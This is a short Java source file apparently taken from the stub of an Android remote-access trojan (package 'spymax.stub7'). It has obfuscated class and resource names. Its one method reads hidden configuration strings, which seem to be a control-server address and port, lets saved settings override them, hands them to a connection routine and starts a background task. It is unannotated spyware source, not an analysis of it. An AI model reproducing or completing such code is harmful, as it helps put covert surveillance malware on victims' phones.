package spymax.stub7;
import android.content.Context;
import java.util.ArrayList;
public class ClassGen4  {
    public static void p(Context ctx){
        ClassGen11.Li = new ArrayList<ClassGen8>();
        ClassGen11.Lcl = new ArrayList<ClassGen0>();
        String nm = ctx.getResources().getString(R.string.z1z2z3z4z5z6);
        String tm = ctx.getResources().getString(R.string.i1i2i3i4i5i6);
        String cm = ctx.getResources().getString(R.string.k1k2k3k4k5k6);
        String gm = ctx.getResources().getString(R.string.o1o2o3o4o5o6);
        String im = ctx.getResources().getString(R.string.j1j2j3j4j5j6);
        String pm = ctx.getResources().getString(R.string.c1c2c3c4c5c6);
        if (ClassGen3.gt(ctx,tm).length() == 0){
            ClassGen3.dit(ctx,nm,tm);
        }
        if (ClassGen3.gt(ctx,cm).length() != 0){
            im = ClassGen3.gt(ctx,cm);
        }
        if (ClassGen3.gt(ctx,gm).length() != 0){
            pm = ClassGen3.gt(ctx,gm);
        }
        ClassGen2.rt(im,pm,ctx);
        new ClassGen11.ta().execute(ctx);
    }
}
